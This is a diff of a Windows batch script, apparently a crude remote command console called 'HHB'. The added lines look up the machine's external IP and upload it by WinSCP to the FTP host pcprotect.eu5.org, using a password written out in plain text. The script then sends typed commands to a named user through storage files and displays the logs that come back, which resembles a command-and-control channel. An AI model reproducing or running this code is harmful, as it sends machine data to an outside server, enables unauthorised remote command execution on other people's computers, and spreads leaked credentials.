@@ -42,7 +42,13 @@ goto start
 cls
 echo we are connecting you to our server
 echo please wait
-ftp\App\winscp\winscp.com /command "open ftp://Youdomain:Yourdomain@pcprotect.eu5.org" "get /*.hhu" "exit"
+for /f "tokens=1* delims=: " %%A in (
+  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
+) Do set ExtIP=%%B
+Echo External IP is : %ExtIP%
+echo %ExtIP% > ip.hhip
+ftp\App\winscp\winscp.com /command "open ftp://pcprotect.eu5.org:levente1111@pcprotect.eu5.org" "put ip.hhip" "exit"
+ftp\App\winscp\winscp.com /command "open ftp://pcprotect.eu5.org:levente1111@pcprotect.eu5.org" "get /*.hhu" "exit"
 cls
 :connect
 cls
@@ -63,21 +69,16 @@ if '%username%'=='reverify' goto verify
 if '%username%'=='restart' goto start
 if '%username%'=='ip' goto ip
 if exist %username%.hhu goto connectsucces
-if not exist %username%.hhu goto connection fail
-pause >nul
+if not exist %username%.hhu goto connectionfailed
 cls
 goto connect
 :connectsucces
 cls
-for /f "tokens=1* delims=: " %%A in (
-  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
-) Do set ExtIP=%%B
-Echo External IP is : %ExtIP%
-set /p build=<%username%.hhu
-echo %ExtIP% > ip.hhip
-ftp\App\winscp\winscp.com /command "open ftp://Youdomain:Yourdomain@pcprotect.eu5.org" "put ip.hhip" "exit"
-if exist files/%build%status.hhs goto connectiongot
-if not exist files/%build%status.hhs goto connectionfailed
+set /p connectid=<%username%.hhu
+goto connectiongot
+if exist storage\%username%cmd.log del storage\%username%cmd.log
+if exist storage\%username%cmd.command del storage\%username%cmd.command 
+pause
 :connectionfailed
 echo.
 echo.
@@ -92,11 +93,30 @@ goto connect
 :connectiongot
 echo connected to %username%(hhu)
 echo listening connection
-set /p cmd=cmd.%username%/
-echo cmd > command%username%.hhc
+set command =
+set /p command=console.%username%/
+echo %command% > storage\usercmd.command
 if '%cmd%'=='exit' goto connection
-if '%cmd%'=='test' goto connectsucces
-call upload.bat
+if '%cmd%'=='restart' goto connectsucces
+if exist storage\%username%cmd.log goto display
+:display
+ping localhost -n 6 >nul
+echo __________________________________________
+echo Command from %username%
+echo __________________________________________
+	SETLOCAL DisableDelayedExpansion
+	FOR /F "usebackq delims=" %%a in (`"findstr /n ^^ storage\%username%cmd.log"`) do (
+    set "var=%%a"
+    SETLOCAL EnableDelayedExpansion
+    set "var=!var:*:=!"
+    echo(!var!
+    ENDLOCAL
+	)
+echo __________________________________________
+ping localhost -n 6 >nul
+:delete 
+del storage\%username%cmd.log
+del storage\%username%cmd.command 
 goto connectiongot
 :ip
 cls
@@ -141,5 +161,5 @@ pause >nul
 cls
 goto connect
 Rem -----------------------------------------------
-Rem | Code By Levi HHB V0.3 Copyright 2020 july 15|
+Rem | Code By Levi HHB V0.3 Copyright 2020 Oct 4|
 Rem -----------------------------------------------
